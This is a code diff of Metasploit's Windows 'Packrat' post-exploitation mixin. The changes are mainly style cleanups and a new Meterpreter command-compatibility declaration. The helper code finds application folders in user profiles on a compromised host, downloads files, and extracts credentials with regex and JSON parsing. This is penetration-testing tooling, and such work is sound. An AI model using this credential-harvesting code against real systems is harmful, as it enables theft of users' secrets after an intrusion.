@@ -1,4 +1,5 @@
 # -*- coding: binary -*-
+
 #
 # A mixin used for providing Modules with post-exploitation options and helper methods
 
@@ -11,22 +12,42 @@ module Msf
   class Post
     module Windows
       module Packrat
-
         include Msf::Post::File
         include Msf::Post::Windows::UserProfiles
-		  
-        # Check to see if the application base folder exists on the remote system.
-        def parent_folder_available?(path, dir, application)
-          parent_folder = dir.split('\\').first
-          dirs = session.fs.dir.foreach(path).collect				
-			
-          return dirs.include? parent_folder 
+
+        def initialize(info = {})
+          super(
+            update_info(
+              info,
+              'Compat' => {
+                'Meterpreter' => {
+                  'Commands' => %w[
+                    core_channel_close
+                    core_channel_eof
+                    core_channel_open
+                    core_channel_read
+                    stdapi_fs_search
+                    stdapi_fs_separator
+                    stdapi_fs_stat
+                  ]
+                }
+              }
+            )
+          )
         end
-		  
-		def artifact_folder_available?(path, dir, application, artifact_child)
-			parent_folder_path = "#{path}#{session.fs.file.separator}#{dir}"
-			return directory?(parent_folder_path)
-		end
+
+        # Check to see if the application base folder exists on the remote system.
+        def parent_folder_available?(path, dir, _application)
+          parent_folder = dir.split('\\').first
+          dirs = session.fs.dir.foreach(path).collect
+
+          return dirs.include? parent_folder
+        end
+
+        def artifact_folder_available?(path, dir, _application, _artifact_child)
+          parent_folder_path = "#{path}#{session.fs.file.separator}#{dir}"
+          return directory?(parent_folder_path)
+        end
 
         def find_files(userprofile, application, artifact, path, dir)
           file_directory = "#{path}\\#{dir}"
@@ -67,7 +88,6 @@ module Msf
         end
 
         def extract_regex(saving_path, artifact_child, artifact, local_loc)
-
           file_string = ''
           ::File.open(saving_path.to_s, 'rb').each do |file_content|
             file_string << file_content.to_s
@@ -80,13 +100,13 @@ module Msf
 
           artifact_child[:regex_search].each do |reg_child|
             reg_child[:regex].map { |r| Regexp.new(r) }.each do |regex_to_match|
-              if file_string =~ regex_to_match
-                file_string.scan(regex_to_match).each do |found_credential|
-                  file_strip = found_credential.gsub(/\s+/, '').to_s
-                  vprint_status(reg_child[:extraction_description].to_s)
-                  print_good file_strip
-                  credential_array << file_strip
-                end
+              next unless file_string =~ regex_to_match
+
+              file_string.scan(regex_to_match).each do |found_credential|
+                file_strip = found_credential.gsub(/\s+/, '').to_s
+                vprint_status(reg_child[:extraction_description].to_s)
+                print_good file_strip
+                credential_array << file_strip
               end
             end
           end
@@ -129,6 +149,9 @@ module Msf
           print_status e.to_s
         end
 
+        # rubocop:disable Lint/UselessAssignment
+        # rubocop:disable Lint/UnusedBlockArgument
+        # rubocop:disable Style/Eval
         def extract_json(saving_path, artifact_child, artifact, local_loc)
           json_file = ::File.read(saving_path.to_s)
           json_parse = JSON.parse(json_file)
@@ -162,6 +185,9 @@ module Msf
         rescue StandardError => e
           print_status e.to_s
         end
+        # rubocop:enable Lint/UselessAssignment
+        # rubocop:enable Lint/UnusedBlockArgument
+        # rubocop:enable Style/Eval
 
         # Download file from the remote system, if it exists.
         def packrat_download_file(saving_path, file_to_download, file, application)
@@ -196,19 +222,17 @@ module Msf
             else
               vprint_error("#{application.capitalize}'s base folder not found in #{userprofile['UserName']}'s user directory\n")
               # skip non-existing file
-                next
+              next
             end
-			  
-			#Check the availability of the folder containing the artifact of interest.
-			if artifact_folder_available?(path, dir, application, artifact_child)
-				vprint_status("Found the folder containing specified artifact for #{artifact}.")
-			else
-				vprint_error("Could not find the folder for the specified artifact #{artifact} at #{dir}.\n")
-				# skip non-existing file
-                next
-			end
-			 
- 
+
+            # Check the availability of the folder containing the artifact of interest.
+            if artifact_folder_available?(path, dir, application, artifact_child)
+              vprint_status("Found the folder containing specified artifact for #{artifact}.")
+            else
+              vprint_error("Could not find the folder for the specified artifact #{artifact} at #{dir}.\n")
+              # skip non-existing file
+              next
+            end
 
             # Get the files that matches the pre-defined artifact name
             found_files = find_files(userprofile, application, artifact, path, dir)
@@ -224,7 +248,6 @@ module Msf
 
             # Download each files found
             found_files.each do |file|
-
               vprint_status "Processing #{file['path']}"
 
               file_split = file['path'].split('\\')
